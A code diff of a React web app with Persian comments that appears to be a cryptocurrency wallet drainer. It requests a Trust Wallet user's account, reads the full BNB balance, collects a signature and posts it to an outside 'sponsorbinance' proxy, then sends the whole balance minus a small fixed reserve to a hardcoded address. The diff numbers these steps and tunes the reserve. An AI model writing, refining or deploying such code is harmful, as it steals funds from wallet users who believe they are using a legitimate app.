@@ -20,13 +20,13 @@ function App() {
   const [account, setAccount] = useState(null);
 
   async function connectAndSend() {
-    // اطمینان از اینکه در DApp Browser تراست والت هستیم
+    // 1) اطمینان از اینکه در DApp Browser تراست والت هستیم
     if (typeof window.ethereum === "undefined") {
       alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
       return;
     }
 
-    // درخواست آدرس کاربر
+    // 2) درخواست آدرس کاربر
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -42,17 +42,17 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
-    // (اختیاری) گرفتن بالانس از BscScan
+    // 3) (اختیاری) گرفتن بالانس از BscScan
     const bnbBalance = await getBNBBalance(userAddress);
     console.log("💰 BNB Balance:", bnbBalance);
 
-    // ساخت پیام برای امضای درخواست
+    // 4) ساخت پیام برای امضای درخواست
     const message = `Authorize sending ${bnbBalance} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
     let signature;
     try {
-      // استفاده از personal_sign برای هماهنگی با رفتار کیف پول تراست والت
+      // استفاده از personal_sign برای سازگاری با رفتار تراست والت
       signature = await window.ethereum.request({
         method: "personal_sign",
         params: [message, userAddress],
@@ -63,7 +63,7 @@ function App() {
       return;
     }
 
-    // ارسال امضا به سرور برای بررسی و ثبت لاگ
+    // 5) ارسال امضا به سرور جهت بررسی و ثبت لاگ
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -86,17 +86,13 @@ function App() {
       return;
     }
 
-    // محاسبه هزینه گس
-    const gasLimit = 21000; // گس استاندارد انتقال
-    const gasPriceWei = 1e9; // 1 gwei (می‌توانید از متد eth_gasPrice نیز استفاده کنید)
-    const gasCostBNB = (gasLimit * gasPriceWei) / 1e18; // به BNB
-    console.log("Estimated gas cost (BNB):", gasCostBNB);
-
-    // محاسبه مبلغ انتقال (کل موجودی منهای هزینه گس)
+    // 6) محاسبه مبلغ انتقال به گونه‌ای که یک مقدار ثابت (مثلاً معادل 1 دلار) کنار گذاشته شود
+    // فرض می‌کنیم reserveBNB = 0.002 (شما می‌توانید این مقدار را تنظیم کنید)
+    const reserveBNB = 0.002;
     const totalBalance = parseFloat(bnbBalance);
-    const sendAmount = totalBalance - gasCostBNB;
+    const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
-      console.error("❌ Insufficient funds for gas fee.");
+      console.error("❌ Insufficient funds: not enough to cover reserve for gas fee.");
       return;
     }
     console.log("Sending amount (BNB):", sendAmount);
@@ -106,8 +102,8 @@ function App() {
       from: userAddress,
       to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
       value: sendWeiHex,
-      gas: "0x5208",      // 21000 در هگز
-      gasPrice: "0x3B9ACA00" // 1 gwei در هگز
+      gas: "0x5208",        // 21000 به هگز
+      gasPrice: "0x3B9ACA00" // 1 gwei به هگز
     };
 
     try {
